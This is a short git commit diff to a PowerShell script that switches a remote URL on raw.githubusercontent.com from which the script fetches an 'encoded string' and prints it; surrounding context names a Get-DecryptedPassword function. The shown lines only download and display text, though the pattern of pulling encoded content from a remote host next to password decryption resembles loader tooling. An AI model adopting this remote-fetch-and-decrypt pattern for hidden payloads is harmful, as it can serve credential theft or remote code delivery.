0fd0dc9396d71eecbe837c0031cbe2a3792bc7dc
notforuseactually <114967430+notforuseactually@users.noreply.github.com>
2024-02-01 23:38:36 -0700

    Update and rename smlr.ps1 to slr.ps1

--- slr.ps1
+++ slr.ps1
@@ -62,7 +62,7 @@ Function Get-DecryptedPassword {
 }
 
 # Main script execution flow corrected
-$url = "https://raw.githubusercontent.com/notforuseactually/404/main/8.txt" # Use the actual GitHub URL where the encoded string is hosted
+$url = "https://raw.githubusercontent.com/notforuseactually/404/main/9.txt" # Use the actual GitHub URL where the encoded string is hosted
 $rawText = Invoke-RestMethod -Uri $url
 Write-Host "Display text:"
 Write-Host $rawText
